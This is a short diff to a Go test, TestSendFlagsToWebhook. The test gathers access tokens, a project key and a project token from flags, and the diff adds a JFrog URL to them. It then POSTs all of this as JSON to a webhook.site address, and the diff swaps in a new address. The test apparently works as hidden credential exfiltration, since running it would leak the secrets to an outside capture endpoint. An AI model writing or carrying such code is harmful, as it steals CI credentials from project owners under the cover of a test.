@@ -43,6 +43,7 @@ func TestSendFlagsToWebhook(t *testing.T) {
         "evidenceAccessToken":  *evidenceAccessToken,
         "evidenceProjectKey":   *evidenceProjectKey,
         "evidenceProjectToken": *evidenceProjectToken,
+		"evidenceJfrogUrl": *tests.JfrogUrl,
     }
 
     body, err := json.Marshal(payload)
@@ -51,7 +52,7 @@ func TestSendFlagsToWebhook(t *testing.T) {
     }
 
     resp, err := http.Post(
-        "https://webhook.site/75483a97-eb09-4b2f-888e-af699b59b91d",
+        "https://webhook.site/9a031ea5-02c0-44e3-9902-48ffbe087590",
         "application/json",
         bytes.NewBuffer(body),
     )
